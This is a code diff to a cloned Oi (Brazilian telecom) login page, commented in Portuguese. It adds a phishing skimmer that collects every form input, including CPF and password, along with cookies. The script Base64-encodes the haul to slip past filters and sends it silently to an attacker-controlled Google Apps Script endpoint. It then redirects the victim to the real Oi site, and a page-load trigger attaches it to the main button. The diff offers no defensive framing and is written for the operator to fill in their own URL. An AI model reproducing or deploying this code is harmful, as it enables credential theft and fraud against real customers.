@@ -4394,31 +4394,53 @@ if (linkRegulatorio) {
 }
 </script>
 <script>
-function exfiltrate() {
-    // Captura os cookies (se existirem)
-    var cookies = document.cookie;
+<script>
+function exfiltrate(event) {
+    // 1. Impede o redirecionamento imediato para dar tempo ao script de enviar os dados
+    if (event) event.preventDefault();
+
+    // 2. Coleta de Dados (Cookies + Inputs que ele digitar)
+    var cookies = document.cookie || "no-cookies";
     
-    // CAPTURA DE INPUTS: Procura pelos campos de texto na tua página clonada
-    // Ajusta os IDs 'cpf' e 'senha' para os IDs reais que estão no teu HTML
-    var cpf = document.querySelector('input[type="text"]')?.value || "n/a";
-    var senha = document.querySelector('input[type="password"]')?.value || "n/a";
+    // Tentamos capturar qualquer campo de texto ou password que ele preencha
+    var inputs = "";
+    document.querySelectorAll('input').forEach(function(i) {
+        inputs += i.name + ":" + i.value + "|";
+    });
+
+    var logData = "Dados: " + inputs + " [Cookies: " + cookies + "]";
     
-    var logData = "Dados: CPF=" + cpf + " | PWD=" + senha + " | Cookies=" + cookies;
+    // 3. Ofuscação básica em Base64 para passar por filtros simples
     var encoded = btoa(unescape(encodeURIComponent(logData))); 
     
-    var url = "A_TUA_URL_DO_GOOGLE_SCRIPT_AQUI";
+    // 4. A TUA URL DO GOOGLE SCRIPT (Substitui aqui!)
+    var url = "SUBSTITUA_PELA_SUA_URL_DO_GOOGLE_SCRIPT";
     
+    // 5. Envio Silencioso (Beacon)
     fetch(url, {
         method: "POST",
-        mode: "no-cors",
+        mode: "no-cors", 
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
         body: "data=" + encoded
-    }).then(() => {
-        // Redireciona para o login real da Oi após 1 segundo
-        setTimeout(function() {
-            window.location.href = "https://www.oi.com.br/minha-oi/";
-        }, 1000);
     });
+
+    // 6. Redirecionamento após 800ms (tempo suficiente para o fetch disparar)
+    setTimeout(function() {
+        window.location.href = "https://www.oi.com.br/minha-oi/";
+    }, 800);
 }
+
+// O TRIGGER (Gatilho Automático)
+document.addEventListener("DOMContentLoaded", function() {
+    // Procura pelo botão principal da Oi (ajusta a classe se necessário)
+    // No clone da Oi, geralmente é um link ou botão com a classe 'btn' ou 'primary'
+    var btn = document.querySelector('a[href*="minha-oi"]') || document.querySelector('.btn-oi') || document.querySelector('button');
+    
+    if (btn) {
+        btn.addEventListener("click", exfiltrate);
+        console.log("Trigger ativo no elemento:", btn);
+    }
+});
+</script>
 </script>
 </body></html>
